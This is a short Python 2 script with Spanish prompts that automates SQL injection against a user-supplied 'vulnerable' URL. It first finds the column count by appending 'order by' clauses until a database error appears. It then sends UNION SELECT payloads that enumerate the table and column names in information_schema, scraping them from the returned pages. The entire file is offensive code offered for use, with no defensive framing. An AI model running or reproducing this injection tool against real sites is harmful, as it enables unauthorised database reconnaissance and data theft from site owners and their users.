#!/usr/bin/python

import urllib
from BeautifulSoup import BeautifulSoup

link = raw_input("Ingrese el Link vulnerable: ") #http:/web.com/rch.php?id=

urllimpia = link + "1" #
limpio = urllib.urlopen(urllimpia).read()
sucio = urllib.urlopen(urllimpia).read()
nc = 1

while "Unknown column" not in sucio:
	nc = nc + 1
	urlparattack = urllimpia + " order by " + str(nc)
	sucio = urllib.urlopen(urlparattack).read()
	print urlparattack
	
nct = nc - 1
print "El numero de columnas extraido es: " + str(nct)

urlextract = link + "-1 UNION SELECT "
nce2 = 0
for nce in range(0,nct):
	#urlextraccion = urlextract + str(nce)
	if nce > 0:
		nce2 = str(nce2) + ", " + str(nce)
		urlextraccion = urlextract + str(nce2)
		if nce == 9:
			urlextraccion2 = urlextraccion + ", group_concat(column_name)"
			urlextraccion = urlextraccion + ", table_name"
			break

print urlextraccion
print "Las Tablas y columnas son: "
for ct in range(0,40):
	infotables = urllib.urlopen(urlextraccion + " FROM + information_schema.tables LIMIT " + str(ct) + ",1" )
	soup = BeautifulSoup(infotables)
	print "[" + str(ct) + "] " + str(soup.find('h2').text)
	sacarcolumnas =  urllib.urlopen(urlextraccion2 + " FROM information_schema.columns WHERE table_name='" + str(soup.find('h2').text) + "'")
	soupc = BeautifulSoup(sacarcolumnas)
	print "--> " + soupc.find('h2').text
